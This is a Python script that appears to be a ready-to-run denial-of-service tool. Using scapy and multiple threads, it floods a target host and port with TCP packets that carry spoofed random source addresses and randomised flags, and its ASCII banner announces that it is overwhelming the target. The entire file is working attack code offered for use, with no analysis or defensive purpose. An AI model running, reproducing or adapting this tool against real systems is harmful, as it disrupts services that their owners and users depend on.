import sys, socket, time, threading
import random, string, os
from scapy.all import *
from urllib.parse import urlparse

_abort = False

def _ssyn(_ip):
    _flags = ['S','A','P','U','F','R','E','C']
    while _abort == False:
        try:
            # choose random flag/s to send
            flag = ''
            max = random.randint(1, len(_flags))
            while max != 0:
                new = random.choice(_flags)
                if not new in flag:
                    flag = flag + new
                    max -=1
                    
            s_port = random.randint(1000,9000)
            s_eq = random.randint(1000,9000)
            w_indow = random.randint(1000,9000)

            IP_Packet = IP ()
            IP_Packet.src = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
            IP_Packet.dst = _ip

            TCP_Packet = TCP ()	
            TCP_Packet.sport = s_port
            TCP_Packet.dport = int(sys.argv[2])
            TCP_Packet.flags = flag # SYN flag set
            TCP_Packet.seq = s_eq
            TCP_Packet.window = w_indow

            send(IP_Packet/TCP_Packet, verbose=0)
        except:
            pass

def _rslv():
    _host = sys.argv[1].lower()
    if not (_host.startswith('http://') or _host.startswith('https://')):
        _host = "http://" + _host

    try:
        _domain = urlparse(_host).netloc
        _ip = socket.gethostbyname(_domain)
        return _domain, _ip
    except KeyboardInterrupt:
        sys.exit('\r\n DNS resolution failed!\r\n')
        
def main():
    global _abort
    _domain, _ip = _rslv()
    
    if len(sys.argv) != 5:
        sys.exit("\r\n   Usage: <target> <port> <time> <threads>\r\n")

    if not 'SUDO_UID' in os.environ:
        sys.exit("\r\n   Script requires root elevation!\r\n")

    print("""\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n
.............. MMM......................
..  ..  ..... . MMN...  ..  ..  ..  .. .
         .MMM7..~MM. ......            .
      .., MMMMMMMMMM..MMMM.            .
.......NMMM,.MMMMMMMMMMN .........b.....
........MMMMMMMMMMMMMM. .......,ZMMM....
.........~MMMMMMMMMMMMM .....?MMMMMMMD..
    .,MMMMMMMMMMMMMMMM~.. .:MMMMMMMMMM. 
..  .., .MMMMMMMMMMMMMMM... MMMMMMMMMMN 
  ..ZMM7NMMMMMMMMMMMMMD.  ... MMMMMMMMM=
........MMMMMMMMMMMMMM .......MMMMMMMMMM
  .. ..MMMMMMMMMMMMMMMI   ...MMMMMMMMMMZ
     .=DMM.MMMMMMMMMMMMM   ..MMMMMMM ...
      .. .+M. .MMMMMMMMM.   .  ,MMMM,  .
      ..:::.. .MMMM    .     .,MMMMMM  .
    .MMMMMMMMMMMMMMMMM7...IMMMMMMMMMM...
     MMMM$   . MMMMMMMMMMMMMMMMMMMMMM. .
    .MMMM     .MMMMMMMMMMMMMMMM,..MM.  .
   .MMMMM.   . MMMMMMMMMMMMNZ.         .
   MMMMMMM    .MMMMMMMM      ... .     .
   MMMMMM .    8MMMMMMM,. ..ZMMMMM..   .
    ,DMM.      .MMMMMMMMMMMMMMMMMM.    .
               .MMMMMMMMMMMMMMMMMM.    .
                =MMMMMMMMMMMIMMMM.     .
               .:MMMMZ.   .8MMM        .
    ... .    ..OMMMM.   ..MMMMM...     .
   .MMMMM. ...MMMMM.  ...MMMMMMMMMM.....
 .NNMMMMMMMMMMMMMM .    ,MMMMMMMMMMM.  .
.MMMMMMMMMMMMMMMM.        .  ?NMMMN..  .
MMMMMM,. $MMMMM8.                      .
MMMM,.    .MM7                         .
D~..                                   .""")
    print("\r\n #offline   Overwhelming " + sys.argv[1] + ":" + sys.argv[2] + " for " + sys.argv[3] + " seconds...\r\n")
    
    _thread = []
    i = 0
    for i in range(0, int(sys.argv[4])):
        i +=1
        x = threading.Thread(target=_ssyn, args=(_ip,))
        _thread.append(x)
        x.start()
    
    _duration = time.time() + int(sys.argv[3])
    try:
        while time.time() < _duration:
            pass
    except KeyboardInterrupt:
        pass

    _abort = True
     
    for y in _thread:
        y.join()
         
    sys.exit('\r\n Done!\r\n')
    
if __name__ == "__main__":
    main()
